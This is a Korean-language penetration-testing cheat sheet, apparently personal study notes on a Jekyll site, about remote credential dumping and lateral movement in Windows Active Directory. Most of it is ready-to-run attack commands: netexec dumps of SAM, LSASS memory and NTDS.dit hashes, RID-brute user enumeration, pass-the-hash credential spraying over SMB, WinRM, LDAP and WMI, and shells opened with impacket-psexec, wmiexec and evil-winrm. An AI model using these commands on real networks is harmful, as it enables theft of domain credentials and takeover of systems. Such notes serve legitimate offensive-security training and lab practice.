---
layout: page
title: Remote_Hashdump_&_Bruteforce_Hashes
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


# 원격 크리덴셜 덤프 및 활용 가이드

네트워크의 한 시스템에 대한 접근 권한을 획득했다면, 다음 목표는 그 권한을 발판 삼아 다른 시스템의 크리덴셜(해시, 티켓, 비밀번호)을 원격으로 탈취하여 공격 범위를 넓히는 것입니다. 이 가이드는 `netexec`과 `impacket`을 중심으로 원격 크리덴셜 덤프와 활용법을 설명합니다.

---

### **1. 원격 해시 덤프 (Remote Hash Dumping)**

- **목표:** 현재 보유한 자격증명을 사용하여 원격 시스템의 다양한 위치에 저장된 비밀번호 해시를 추출합니다.

#### **방법 A: SAM 하이브 덤프 (로컬 계정)**
- **설명:** 원격 시스템의 로컬 관리자 권한이 있을 때, SAM 데이터베이스를 덤프하여 로컬 계정들의 NTLM 해시를 획득합니다.

```bash
netexec smb $target -u <local_admin> -p <password> --sam | fgrep -v '[' | awk -F: '{print $4}' | tee dumped_hashes.txt
```

#### **방법 B: LSASS 메모리 덤프 (로그온된 계정)**
- **설명:** 원격 시스템의 로컬 관리자 권한으로 LSASS 프로세스 메모리를 덤프합니다. 최근에 로그온한 도메인 계정의 해시나 평문 비밀번호가 메모리에 남아있을 수 있습니다.

```bash
netexec smb $target -u <local_admin> -p <password> -M lsassy | fgrep '[' | awk '{print $6}' >> dumped_hashes.txt
```

#### **방법 C: NTDS.dit 덤프 (모든 도메인 계정)**
- **설명:** 도메인 컨트롤러(DC)의 관리자 권한이 있을 때, Active Directory의 모든 사용자 및 컴퓨터 계정의 해시가 저장된 `NTDS.dit` 데이터베이스 파일을 덤프합니다. 도메인 장악의 핵심 단계입니다.

```bash
netexec smb <DC_IP> -u <domain_admin> -p <password> -M ntdsutil | fgrep -v '[' | awk -F: '{print $4}' >> dumped_hashes.txt
```

#### **방법 D: rid-brute**
- **설명:**  도메인의 모든 사용자 목록을 가져옵니다.

```bash
netexec smb $target -u 'user1' -p 'Password1!' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee users.txt
```

---

### **2. 수집된 크리덴셜 정리 및 재사용**

- **목표:** 덤프 과정에서 지저분하게 수집된 해시들을 정리하고, 이를 다른 시스템에 대한 공격에 재사용하여 측면 이동(Lateral Movement)을 시도합니다.

#### **1단계: 해시 및 사용자 목록 정리**
- 덤프된 결과에서 순수한 NTLM 해시와 사용자 이름만 추출하여 별도의 파일로 저장합니다.

```bash
# 덤프 결과에서 해시만 추출하여 정렬 및 중복 제거
awk -F: '{print $4}' dumped_hashes.txt | sort -u > unique_hashes.txt

awk 'NF {print $1}' dumped_hashes.txt | sort | uniq | tee unique_hashes.txt

# 덤프 결과에서 사용자 이름만 추출
awk '{print $1}' dumped_users.txt > users.txt
```

#### **2단계: 크리덴셜 스프레이 (Credential Spraying)**
- 정리된 사용자 목록과 해시 목록을 사용하여 네트워크의 다른 시스템들에 대규모 인증을 시도합니다.

```bash
# 여러 프로토콜에 대해 수집한 해시로 인증 시도
netexec smb $target -u users.txt -H unique_hashes.txt --continue-on-success
netexec winrm $target -u users.txt -H unique_hashes.txt --continue-on-success
netexec ldap $target -u users.txt -H unique_hashes.txt --continue-on-success
netexec wmi $target -u users.txt -H unique_hashes.txt --continue-on-success
```

---

### **3. 셸 획득**

- **목표:** 새로 찾아낸 유효한 자격증명을 사용하여 다른 시스템의 셸을 획득합니다.

```bash
rlwrap impacket-psexec <domain>/<user>@$new_target -hashes :<ntlm_hash>
```

```bash
evil-winrm -i $new_target -u <user> -H <ntlm_hash>
```

```bash
rlwrap impacket-wmiexec <domain>/<user>@$new_target -hashes :<ntlm_hash>
```

